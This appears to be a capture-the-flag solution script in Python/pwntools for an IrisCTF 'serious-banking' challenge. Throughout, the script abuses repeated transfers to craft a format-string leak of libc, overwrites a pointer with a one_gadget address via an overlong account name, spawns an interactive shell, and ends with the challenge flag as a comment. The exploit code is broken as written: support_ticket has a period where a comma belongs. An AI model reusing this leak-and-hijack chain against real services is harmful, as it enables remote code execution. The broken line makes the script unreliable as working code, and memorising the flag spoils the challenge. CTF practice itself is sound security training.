#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("serious-banking.chal.irisc.tf", 10001)
	else:
		r = gdb.debug([exe.path])
	return r

r = conn()

def create_account(name):
	r.sendlineafter(b'> ', b'1')
	r.sendlineafter(b'Name: ', name)
	r.recvuntil(b'Your id is')
	return int(r.recvline().strip())

def support_ticket(id, issue):
	r.sendlineafter(b'> ', b'5')
	r.sendlineafter(b'concern?'. str(id).encode())
	r.sendlineafter(b'):', issue)

def transfer(from_id, to_id, amount):
	r.sendlineafter(b'> ', b'3')
	r.sendlineafter(b'from? ', str(from_id).encode())
	r.sendlineafter(b'to? ', str(to_id).encode())
	r.sendlineafter(b'transfer? ', str(amount).encode())


def main():

	for i in range(135):
		create_account(b"Usename" + str(i).encode())
	
	x = 0x5f5f5f5f5f5f7025 - 0x5f5f5f5f5f5f5f5f

	while x >= 35:
		print(f"{x=}")
		transfer(129, 128, 35)
		x -= 35

	if x > 0:
		transfer(129, 128, x)

	r.recvuntil(b'Interface\n')
	leak = int(r.recvuntil(b"____", drop=True), 16)

	libc.address = leak - (0x7ffff7ca57e3 - 0x7ffff7aea000)
	success(f'{hex(libc.address)=}')

	ogs = [a + libc.address for a in [280959, 281043, 938758]]
	create_account(cyclic(cyclic_find('raaa')) + p64(ogs[2]))
	id = 135
	support_ticket(id, b"Support Ticket!!"*5)

	r.sendlineafter(b'>', b'6')

	r.interactive()


if __name__ == "__main__":
	main()

# irisctf{w0r1d_c1a55_cu5t0m3r_5upp0r7}
